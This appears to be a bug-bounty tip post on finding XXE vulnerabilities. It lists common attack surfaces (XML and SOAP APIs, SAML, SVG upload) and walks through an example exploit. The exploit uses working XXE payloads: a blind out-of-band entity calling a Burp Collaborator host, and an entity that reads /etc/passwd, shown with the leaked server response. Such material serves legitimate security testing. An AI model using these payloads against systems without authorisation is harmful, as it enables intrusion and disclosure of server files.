https://x.com/Jayesh25_/status/1726556241151885727?s=20
When it comes to identifying XXE issues, you'll find these vulnerabilities almost everywhere. 

Here's my top 5 list of features and areas you should keep an eye on when testing for XXE issues:

# 1️⃣ XML APIs -  
Test target apps and see If XML is being used or alternatively try replacing content-type: application/json to application/xml or text/xml with a XML body

# 2️⃣ SOAP APIs - 
Working on a target app that supports SOAP? Test for XXE payloads 

# 3️⃣ SAML Authentication - 
Test XXE on the SAML flow

# 4️⃣ HTML parsing (e.g., converting HTML to some other file type)

# 5️⃣ SVG File Upload - 
Assuming that the app supports SVG file upload and parses SVG. You can try this payload https://gist.github.com/jakekarnes42/b879f913fd3ae071c11199b9bd7ba3a7?short_path=f3432ae 

These areas often conceal potential XXE vulnerabilities waiting to be uncovered. 

# The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.

<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://BURP_COLLABORATOR[.]burpcollaborator[.]net/x"> %ext;
]>

# 📦 For a plethora of payloads and examples, explore the XXE Injection cheat sheet at 🔗 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection.


# Example Exploit Case

2. The target app was exclusively using application/json. A typical request looked like this:

Request:
POST /v1/organizations/ HTTP/1.1
Host: target(.)com
Content-Type: application/json

{"search":"Id","value":"1"}

Response:
{"description": "ID 1 not found"}

3. Intrigued by articles highlighting unconventional attack vectors, I decided to switch things up. I changed the Content-Type header to application/xml:

Request:

POST /v1/organizations/ HTTP/1.1
Host: target(.)com
Content-Type: application/xml

{"search":"Id","value":"1"}

Response:
{"errors":{"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."}}

4. The error hinted at the server's ability to process XML. A crucial revelation. Building on this, I converted the JSON body to XML:

From:

{"search":"Id","value":"1"}

To:

<?xml version="1.0" encoding="UTF-8" ?>
<root>
  <search>Id</search>
  <value>1</value>
</root>

5. Sending a request with the new XML payload, the server still responded as expected:

Request:

POST /v1/organizations/ HTTP/1.1
Host: http://target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8" ?>
<root>
  <search>Id</search>
  <value>1</value>
</root>

Response:
{"description": "ID 1 not found"}

6. Confident in the server's XML input acceptance, it was time for the final attack:

Request:

POST /v1/organizations/ HTTP/1.1
Host: target(.)com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
  <search>Id</search>
  <value>&xxe;</value>
</root>

Response:

{"description": "ID root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys.... not found"}

7. Key Takeaways: Experimentation is key. Always try changing the Content-Type header to application/xml or text/xml; it may reveal unexpected behaviors. While it might not always work, it's a valuable addition to your testing toolkit.